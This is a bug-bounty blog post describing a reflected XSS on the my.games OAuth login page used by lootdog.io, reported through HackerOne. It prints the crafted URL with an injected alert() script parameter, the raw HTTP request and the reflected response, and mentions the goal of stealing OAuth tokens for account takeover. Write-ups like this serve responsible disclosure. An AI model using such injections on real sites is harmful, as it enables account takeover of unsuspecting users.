---
title: "Reflected XSS on a Public Program"
layout: post
date: 2021-02-08 12:00
tag:
- XSS
- Misconfiguration
category: blog
author: naveen
description: Reflected XSS on a Public Program.
---

# Target
Target is https://lootdog.io/ from mailru which had a large scope on HackerOne. After an hour of recon, I found an unintended behavior in the Oauth request so I decided to play around.

## Technical Analysis
I intercepted the login request from https://lootdog.io/ and sent it to the repeater and observed the way the Oauth works. The https://lootdog.io/ uses https://account.my.games as an Oauth service when you click login it will redirect you to https://account.my.games and will let you log in if you have a legitimate account. So I decided to check for Reflected XSS or any Open redirect issues to grab the Oauth token to take Over the user's account.

I added an extra parameter at the end of the keyed value on the request as below,

`&Set-Cookie: <script>alert(“Hacked By Deathstroke”)</script>`

The finally crafted URL will be like as below,

```
https://account.my.games//oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&client_id=lootdog_io&lang=EN&signup_method=email%2Cphone&signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&Set-Cookie: <script>alert("Hacked By Deathstroke")</script>
```

After inserted the payload at the end of the URL sent the request as below and observed the response.

## Request

```http
GET /oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&client_id=lootdog_io&lang=EN&signup_method=email%2Cphone&signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&Set-Cookie: <script>alert("Hacked By Deathstroke")</script> HTTP/1.1 
Host: account.my.games 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: https://lootdog.io/ 
Connection: close
```

## Response

```http
<script>alert("Hacked By Deathstroke")</script> HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 
X-Frame-Options: SAMEORIGIN 
Content-Length: 3982 
Vary: Origin
```

But unfortunately, no access token is reflected on the response at the time. But I reported to the program because the issue may cause some other security threats.

![img](/assets/images/blogs/XSS_lootdog/1.webp)

Seems that the payload worked which is reflected on the HTTP response.

![img](/assets/images/blogs/XSS_lootdog/2.webp)

It was my first Vulnerability that I found, so I quickly created a report and sent it to HackerOne. The HackerOne analyst verified the vulnerability and triaged the report after some discussions and the issue was resolved and they rewarded me a HOF.

Thank you for reading.

Follow me on Twitter : [thevillagehacker](https://twitter.com/thevillagehackr)